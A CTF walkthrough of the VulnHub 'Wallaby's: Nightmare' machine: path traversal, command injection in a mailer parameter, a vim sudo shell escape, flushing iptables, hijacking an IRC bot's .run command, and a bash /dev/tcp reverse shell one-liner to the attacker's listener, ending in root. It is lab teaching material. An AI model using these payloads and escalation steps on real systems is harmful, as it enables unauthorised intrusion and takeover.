# Wallaby's: Nightmare

## 1.GET VM IP

```text
root@kali: arp-scan -I eth1 -l

Interface: eth1, type: EN10MB, MAC: 00:0c:29:3a:bc:b3, IPv4: 192.168.127.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.127.1   00:50:56:c0:00:01       VMware, Inc.
192.168.127.233 00:0c:29:96:ab:45       VMware, Inc.
192.168.127.254 00:50:56:fd:64:8a       VMware, Inc.
```

The IP address is `192.168.127.233`, let's enumerate the machine.

## 2.Enumeration

```text
root@kali: nmap -sV -sC -p- -v -oN fullscan 192.168.127.233

Nmap scan report for 192.168.127.233
Host is up (0.00012s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 6e:07:fc:70:20:98:f8:46:e4:8d:2e:ca:39:22:c7:be (RSA)
|   256 99:46:05:e7:c2:ba:ce:06:c4:47:c8:4f:9f:58:4c:86 (ECDSA)
|_  256 4c:87:71:4f:af:1b:7c:35:49:ba:58:26:c1:df:b8:4f (ED25519)
80/tcp   open     http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Wallaby's Server
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
6667/tcp filtered irc
MAC Address: 00:0C:29:96:AB:45 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

port `6667` is filtered here, it's weird, let's begin by checking the website :

![firstPage](https://github.com/Git-K3rnel/VulnHub/assets/127470407/9044b9e0-6133-4d36-adb8-1aa1411d4985)

i entered my name and clicked submit :

![secondPage](https://github.com/Git-K3rnel/VulnHub/assets/127470407/382e8f34-5d08-4879-ae79-116ff0617291)

in the next page there is a message, but look at the URL and the page parameter which can be manipulated

i entered another word in `page` parameter and the page below showed up :

![testPage](https://github.com/Git-K3rnel/VulnHub/assets/127470407/12e9fad5-4921-40e0-81d2-d7bc1a0d9b8a)

now i'm suspicious to this parameter, i tried path traversal payloads and it worked :

![pathTraversal](https://github.com/Git-K3rnel/VulnHub/assets/127470407/661ac9e0-e246-4ff4-96bf-dd340e447687)

we found three users here :

```text
walfin:x:1000:1000:walfin,,,:/home/walfin:/bin/bash
steven?:x:1001:1001::/home/steven?:/bin/bash
ircd:x:1003:1003:,,,:/home/ircd:/bin/bash
```

then i tried to see other files like `/etc/shadow` that this message appeared :

![shadowFile](https://github.com/Git-K3rnel/VulnHub/assets/127470407/4a39972b-2181-4e13-bec2-7d313a7ed7c1)

after this i could not connect to machine on port 80 any more, i think diffucly increase is that the service is not 

available on port 80, so i scanned the machine one more time :

```text
root@kali: nmap -sV -sC  -p- -v -oN fullscan2 192.168.127.233

Nmap scan report for 192.168.127.233
Host is up (0.00013s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 6e:07:fc:70:20:98:f8:46:e4:8d:2e:ca:39:22:c7:be (RSA)
|   256 99:46:05:e7:c2:ba:ce:06:c4:47:c8:4f:9f:58:4c:86 (ECDSA)
|_  256 4c:87:71:4f:af:1b:7c:35:49:ba:58:26:c1:df:b8:4f (ED25519)
6667/tcp  filtered irc
60080/tcp open     http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Wallaby's Server
|_http-server-header: Apache/2.4.18 (Ubuntu)
MAC Address: 00:0C:29:96:AB:45 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

yes, the service is now has been moved on port 60080, so let's open the site on this port :

![newPage](https://github.com/Git-K3rnel/VulnHub/assets/127470407/ad7c2230-6008-43b3-84ea-83c93f0719d5)

this time fuzzing the website, i found nothing, so tried to check it with `nikto` :

```text
root@kali: nikto -host http://192.168.127.233:60080

- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.127.233
+ Target Hostname:    192.168.127.233
+ Target Port:        60080
+ Start Time:         2023-09-30 03:15:39 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /index.php?page=../../../../../../../../../../etc/passwd: The PHP-Nuke Rocket add-in is vulnerable to file traversal, allowing an attacker to view any file on the host. (probably Rocket, but could be any index.php).
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ 8102 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2023-09-30 03:15:54 (GMT-4) (15 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

yes, it found again the page `/index.php?page=../../../../../../../etc/passwd`, now i can fuzz this parameter again :

```text
root@kali: ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.127.233:60080/index.php?page=FUZZ -fs 898

home                    [Status: 200, Size: 1146, Words: 220, Lines: 31, Duration: 4ms]
contact                 [Status: 200, Size: 895, Words: 182, Lines: 27, Duration: 271ms]
'                       [Status: 200, Size: 1742, Words: 315, Lines: 39, Duration: 2ms]
index                   [Status: 200, Size: 1361, Words: 279, Lines: 39, Duration: 516ms]
mailer                  [Status: 200, Size: 1084, Words: 204, Lines: 30, Duration: 4ms]
blacklist               [Status: 200, Size: 993, Words: 202, Lines: 28, Duration: 5ms]
```

let's check these words for page parameter, on checking the `mailer` value i reached to this page :

![comming soon](https://github.com/Git-K3rnel/VulnHub/assets/127470407/2672f542-8572-41a8-95f1-a66716cd6f30)

checking the page source shows a comment section :

![comment](https://github.com/Git-K3rnel/VulnHub/assets/127470407/aaec13b9-6775-485e-9ef3-3d8ec148b5b3)

that says we can send a mail with the URL like `/?page=mailer&mail=message`, this new parameter (mail) should be tested.

i simply entered the `id` value and it showed the output of id command in linux system :

![id](https://github.com/Git-K3rnel/VulnHub/assets/127470407/4e8ef4bd-a30f-4205-918d-2bf86166d85a)

yes, we have command injection here, and we can get a reverse shell.

## 3.Gaining Shell

I used a python reverse shell and URL encoded it, started a listener and got the shell as below :

![shell](https://github.com/Git-K3rnel/VulnHub/assets/127470407/dff8d11f-e174-4d70-b476-be2747674f33)


## 4.Privilege Escalation 1

Check the sudo permissions :

```text
www-data@ubuntu:/home$ sudo -l

Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (waldo) NOPASSWD: /usr/bin/vim /etc/apache2/sites-available/000-default.conf
    (ALL) NOPASSWD: /sbin/iptables
```

we can run vim as user waldo and also iptables without password :

first let's check listening ports on the machine :

```text
www-data@ubuntu:/home$ netstat -plnt

(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:6667            0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp6       0      0 :::60080                :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
```

we can see that port 6667 is on listen state, and it was filtered when we first scanned the machine with nmap

i just use iptables to flush any deny action on this port :

before flush :

```text
www-data@ubuntu:/home$ sudo iptables  -v -L -n
Chain INPUT (policy ACCEPT 1034K packets, 124M bytes)
 pkts bytes target     prot opt in     out     source               destination
  270 17659 ACCEPT     tcp  --  *      *       127.0.0.1            0.0.0.0/0            tcp dpt:6667
    4   176 DROP       tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:6667

Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination

Chain OUTPUT (policy ACCEPT 1031K packets, 330M bytes)
 pkts bytes target     prot opt in     out     source               destination
```

after flush :

```text
www-data@ubuntu:/home$ sudo iptables -F

www-data@ubuntu:/home$ sudo iptables  -v -L -n
Chain INPUT (policy ACCEPT 16 packets, 842 bytes)
 pkts bytes target     prot opt in     out     source               destination

Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination

Chain OUTPUT (policy ACCEPT 10 packets, 647 bytes)
 pkts bytes target     prot opt in     out     source               destination
```

now we can reach this port with nmap :

```text
root@kali: nmap -sV -sC 192.168.127.233 -p6667

Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-30 03:44 EDT
Nmap scan report for 192.168.127.233
Host is up (0.00038s latency).

PORT     STATE SERVICE VERSION
6667/tcp open  irc     UnrealIRCd
| irc-info:
|   users: 4
|   servers: 1
|   chans: 1
|   lusers: 4
|   lservers: 0
|   server: wallaby.fake.server
|   version: Unreal3.2.10.4. wallaby.fake.server
|   uptime: 0 days, 0:49:01
|   source ident: nmap
|   source host: 59FC08E0.5EB7BEDC.CD8EC85.IP
|_  error: Closing Link: hcoevlpsy[192.168.127.128] (Quit: hcoevlpsy)
MAC Address: 00:0C:29:96:AB:45 (VMware)
Service Info: Host: wallaby.fake.server
```

so this is irc service and is open to communicate, the second permission is to run VIM as waldo

so lets exploit this to become user waldo :

```text
www-data@ubuntu:/home/waldo$ sudo -u waldo /usr/bin/vim /etc/apache2/sites-available/000-default.conf
```

in VIM widow type `:!/bin/bash` and you will get a terminal with user waldo access :


![waldo](https://github.com/Git-K3rnel/VulnHub/assets/127470407/d7fbaaa4-2be7-42fb-ac79-86434cc1b67e)

```text
waldo@ubuntu:~$ id
uid=1000(waldo) gid=1000(waldo) groups=1000(waldo),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare)
```

## 5.Privilege Escalation 2

Now that we have waldo access, go to home directory and visite waldo home :

```text
waldo@ubuntu:~$ ls -l
total 4
-rwxrwxr-x 1 waldo waldo 113 Dec 16  2016 irssi.sh
```

this script exists here and when you see the content, there is a tmux session in it :

```text
waldo@ubuntu:~$ cat irssi.sh
#!/bin/bash
tmux new-session -d -s irssi
tmux send-keys -t irssi 'n' Enter
tmux send-keys -t irssi 'irssi' Ente
```

see the tmux list :

```text
waldo@ubuntu:~$ tmux ls
irssi: 1 windows (created Sat Sep 30 03:23:22 2023) [80x23]
```

let's connect to this tmux session and see what's going on :

```text
waldo@ubuntu:~$ tmux attach
```

it shows that waldo has connected to server, we can connect to server with hexchat too :

after adding the server, we see there is no channel to join ;

![hexchat](https://github.com/Git-K3rnel/VulnHub/assets/127470407/aa1af440-ee16-4829-a6ca-13b95380a607)

use `/server 192.168.127.233 6667` to connect to server :

![hexchat2](https://github.com/Git-K3rnel/VulnHub/assets/127470407/dd81e8e7-f08c-45f6-96db-a53e036091b2)


again i connected to waldo tmux session and entered the `/list` to find whcih channels waldo has joined :

```text
waldo@ubuntu:~$ tmux attack

/list

04:47 -!- Channel Users  Name
04:47 -!- #wallabyschat 2
04:47 -!- End of /LIST
```

we can now join to this channel too in hexchat with `/join #wallabyschat` command :


![hexchat3](https://github.com/Git-K3rnel/VulnHub/assets/127470407/9805bf87-adb4-4c76-97ab-ae97efee62a2)


as we see here, me and waldo and wallabys bot are in the same chat.

i navigated to wallaby home directory and found `.sopel`, from there i checked the sub directories untill i reached the `modules` directory

which has a `run.py` in it, see the content :

```python
waldo@ubuntu:/home/wallaby/.sopel/modules$ cat run.py

import sopel.module, subprocess, os
from sopel.module import example

@sopel.module.commands('run')
@example('.run ls')
def run(bot, trigger):
     if trigger.owner:
          os.system('%s' % trigger.group(2))
          runas1 = subprocess.Popen('%s' % trigger.group(2), stdout=subprocess.PIPE).communicate()[0]
          runas = str(runas1)
          bot.say(' '.join(runas.split('\\n')))
     else:
          bot.say('Hold on, you aren\'t Waldo?')
```

as it shows here we can use `.run` to execute an os command so tried it with my my user as `K3rnel` in hexchat :

![hexchat4](https://github.com/Git-K3rnel/VulnHub/assets/127470407/5b29858a-a18a-40a8-bfec-6c2cc423b817)

it needs user waldo to run the os commands, so it terminated the waldo tmux session and changed my nickname to waldo :

```text
tmux kill-session -t irssi
```

i used `/nick waldo` to change my nickname and tried to use `.run` command :

![hexchat5](https://github.com/Git-K3rnel/VulnHub/assets/127470407/c15a79c5-d6c5-46ef-8637-ede796e34895)

yes, finally we can run another reverse shell from here :

```text
.run bash -c "bash -i >& /dev/tcp/192.168.127.128/4444 0>&1"
```

and we get a shell :

```text
root@kali: nc -nvlp 4444

listening on [any] 4444 ...
connect to [192.168.127.128] from (UNKNOWN) [192.168.127.233] 41266
bash: cannot set terminal process group (750): Inappropriate ioctl for device
bash: no job control in this shell
wallaby@ubuntu:~$ id
id
uid=1001(wallaby) gid=1001(wallaby) groups=1001(wallaby),4(adm)
```

## 6.Privilege Escalation 3

Check sudo permissions and get root :

```text
wallaby@ubuntu:~$ sudo -l
sudo -l
Matching Defaults entries for wallaby on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wallaby may run the following commands on ubuntu:
    (ALL) NOPASSWD: ALL


wallaby@ubuntu:~$ sudo bash

id
uid=0(root) gid=0(root) groups=0(root)

cd /root

cat flag.txt
###CONGRATULATIONS###

You beat part 1 of 2 in the "Wallaby's Worst Knightmare" series of vms!!!!

This was my first vulnerable machine/CTF ever!  I hope you guys enjoyed playing it as much as I enjoyed making it!

Come to IRC and contact me if you find any errors or interesting ways to root, I'd love to hear about it.

Thanks guys!
-Waldo
```

this is how you can get root on this box :)






